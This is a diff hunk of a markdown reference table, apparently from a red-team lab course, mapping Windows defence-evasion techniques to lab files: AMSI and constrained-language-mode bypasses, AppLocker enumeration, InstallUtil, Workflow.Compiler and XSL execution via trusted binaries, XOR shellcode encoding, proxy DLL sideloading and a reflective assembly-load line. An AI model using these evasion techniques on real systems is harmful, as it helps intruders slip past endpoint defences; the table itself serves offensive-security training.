-| CLM bypass | Custom Runspace (`m05-clm-bypass-runspace.ps1`) |
+| Static signature on a custom EXE | `m13-xor-encoder.py` + custom Runner |
 | AMSI handling | `m05-amsi-bypass-variants.ps1` |
-
-## Related lab-file list
-
-| File | Notes |
-|---|---|
-| `m05-amsi-bypass-variants.ps1` | Multiple AMSI-handling variants (pick by host) |
-| `m05-clm-bypass-runspace.ps1` | Custom Runspace CLM bypass |
-| `m05-applocker-enum.ps1` | Enumerate effective rules and writable allow paths |
-| `m05-installutil-runner.cs` | InstallUtil-compatible assembly |
-| `m05-workflow-compiler-runner.cs` | Workflow host input assembly |
-| `m05-xsl-exec.xsl` | XSL script-exec template |
-| `m05-lolbas-notes.md` | Trusted-host quick reference |
-| `m13-xor-encoder.py` | Shellcode encoding (scenario 18) |
-| `m04-proxy-dll-sideload.c` | Proxy DLL (scenario 22) |
+| CLM bypass | Custom Runspace (`m05-clm-bypass-runspace.ps1`) |
+| Managed assembly load | `[Reflection.Assembly]::Load($bytes)` + reflective entry call |
+| InstallUtil runner | `m05-installutil-runner.cs` |
+| InstallUtil blocked | `Microsoft.Workflow.Compiler.exe run.xml results.xml` |
+| XSL exec | `m05-xsl-exec.xsl` via `msxsl` or `wmic /format` |
+| Trusted-host menu | `m05-lolbas-notes.md` |
